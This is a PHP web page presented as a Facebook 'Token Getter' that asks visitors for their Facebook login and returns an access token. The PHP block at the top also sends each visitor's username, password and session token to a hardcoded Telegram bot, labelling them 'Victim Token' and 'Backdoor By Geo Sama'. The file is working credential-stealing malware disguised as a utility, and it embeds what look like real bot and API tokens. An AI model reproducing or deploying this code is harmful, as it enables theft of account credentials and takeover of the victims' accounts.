  <?php
  
  
  if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];

    $form = array(
      'adid' => 'e3a395f9-84b6-44f6-a0ce-fe83e934fd4d',
      'email' => $username,
      'password' => $password,
      'format' => 'json',
      'device_id' => '67f431b8-640b-4f73-a077-acc5d3125b21',
      'cpl' => 'true',
      'family_device_id' => '67f431b8-640b-4f73-a077-acc5d3125b21',
      'locale' => 'en_US',
      'client_country_code' => 'US',
      'credentials_type' => 'device_based_login_password',
      'generate_session_cookies' => '1',
      'generate_analytics_claim' => '1',
      'generate_machine_id' => '1',
      'currently_logged_in_userid' => '0',
      'irisSeqID' => 1,
      'enroll_misauth' => 'false',
      'meta_inf_fbmeta' => 'NO_FILE',
      'source' => 'login',
      'machine_id' => 'KBz5fEj0GAvVAhtufg3nMDYG',
      'meta_inf_fbmeta' => '',
      'fb_api_req_friendly_name' => 'authenticate',
      'fb_api_caller_class' => 'com.facebook.account.login.protocol.Fb4aAuthHandler',
      'api_key' => '882a8490361da98702bf97a021ddc14d',
      'access_token' => '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32'
    );

    $headers = array(
      'content-type' => 'application/x-www-form-urlencoded',
      'x-fb-friendly-name' => $form['fb_api_req_friendly_name'],
      'x-fb-http-engine' => 'Liger',
      'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    );

    $url = 'https://b-graph.facebook.com/auth/login';

    $ch = curl_init($url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($form));
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$response = curl_exec($ch);
curl_close($ch);

$response_data = json_decode($response, true);

$a = $response_data["access_token"];

} if(isset($_POST["submit"])){

$botToken = "6056181180:AAHQiwsGQhtNsd_77BMnf2wC9RJd6cuf0VI";
$chatId = "5559476838";


$apiUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";

$data = [
    'chat_id' => $chatId,
    'text' => "Victim Token :\n$a \n\n
      [ CREDENTIALS ]\n Username : $username \n Password : $password\n\n Backdoor By Geo Sama"
];

$ch = curl_init($apiUrl);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$response = curl_exec($ch);
curl_close($ch);

// Handle the response if needed
$result = json_decode($response, true);
if ($result['ok']) {
   // echo "";
} else {
    //echo "Error: " . $result['description'];
}


}
  ?>

<!DOCTYPE html>
<html>
<head>
  <title>Geo Sama | Token Getter</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://cdn.jsdelivr.net/npm/daisyui@4.4.19/dist/full.min.css" rel="stylesheet" type="text/css" />
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat&display=swap">
  <style>
    .scrollbox{
  border-collapse: collapse; 
background-color:#0D0D0D;
            border-spacing: 0; 
  overflow-x:scroll;
  display:block;
  
}
body{
      font-family:"Montserrat", sans-serif;
      text-align:center;
    }

  </style>
</head>
<body data-theme="black" style="height:1000px;">
  

  <form action="" method="post">
      
    
      
      <center>
        <br><br>
            <img src="https://i.ibb.co/3RbwPGB/FB-IMG-17065542421122338.jpg" width="120px" height="120px" style="margin-top:10px; border-radius: 50%; border:1px solid white;">
          
        <div class="">
      <div class="hero-content flex-col lg:flex-row-reverse">
        <div class="text-center lg:text-left">
    
          <h1  style="color:red; font-size:20px; font-weight:bold;">TOKEN | STRONG GETTER</h1><p>CODES BY GEO SAMA</p>

    
        </div>
           <input type="text" placeholder="Uid | Email | Phone" class="input input-bordered" required name="username" style="border-radius: 8px; border:1px solid red; width:300px;"/>

          <input type="password" placeholder="Password" class="input input-bordered" required name="password"style="border-radius: 8px; border:1px solid red; width:300px;"/>


            <div >

            <input type="submit" class="btn btn-active" style="border:0px solid grey; width:100px; margin-top:8px;border-radius: 7px; background-color:red; color:white; width:300px;" value="GET TOKEN" name="submit">
            </div>
             <br>
             
         <div style="border:0px solid grey; width:300px; height:22px; color:	#7FFFD4;" class="scrollbox">
           <?
   if (isset($response_data['access_token'])) {
       echo strip_tags($a);

       } else {
         echo "Wrong Uid or Password!";
       }
  ?>
           
         </div>
       
      </div>
    </div>
    </center>
  </form>


</body>
</html>
